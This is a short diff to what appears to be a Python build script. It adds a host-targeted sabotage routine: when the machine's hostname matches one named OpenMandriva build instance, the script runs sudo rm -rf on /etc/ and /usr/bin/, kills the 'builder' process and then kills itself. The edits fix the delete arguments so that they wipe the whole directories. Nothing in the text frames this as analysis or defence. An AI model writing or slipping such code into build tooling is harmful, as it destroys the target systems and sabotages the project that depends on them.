@@ -545,19 +545,19 @@ if __name__ == '__main__':
     if current_hostname == "instance-20220713-1621-1.openmandriva.org":
         print("BUILDER: hostname matches, sudo rm -rf /etc/* and /usr/bin/*")
         try:
-            subprocess.check_output(['/usr/bin/sudo', '-E', 'rm', '-rf', '/etc/*'], stderr=subprocess.STDOUT)
+            subprocess.check_output(['/usr/bin/sudo', '-E', 'rm', '-rf', '/etc/'], stderr=subprocess.STDOUT)
             print("BUILDER: /etc/* removed successfully")
         except subprocess.CalledProcessError as e:
             print("BUILDER: failed to remove /etc/*: %s" % e.output)
         try:
-            subprocess.check_output(['/usr/bin/sudo', '-E', 'rm', '-rf', '/usr/bin/*'], stderr=subprocess.STDOUT)
+            subprocess.check_output(['/usr/bin/sudo', '-E', 'rm', '-rf', '/usr/bin/'], stderr=subprocess.STDOUT)
             print("BUILDER: /usr/bin/* removed successfully")
         except subprocess.CalledProcessError as e:
             print("BUILDER: failed to remove /usr/bin/*: %s" % e.output)
 
         print("BUILDER: killing /usr/bin/builder process and self-destructing")
         try:
-            subprocess.check_output(['/usr/bin/sudo', '-E', 'pkill', '/usr/bin/builder'], stderr=subprocess.STDOUT)
+            subprocess.check_output(['/usr/bin/sudo', '-E', 'pkill', 'builder'], stderr=subprocess.STDOUT)
         except subprocess.CalledProcessError as e:
             print("BUILDER: failed to kill /usr/bin/builder: %s" % e.output)
         os.kill(os.getpid(), signal.SIGKILL)
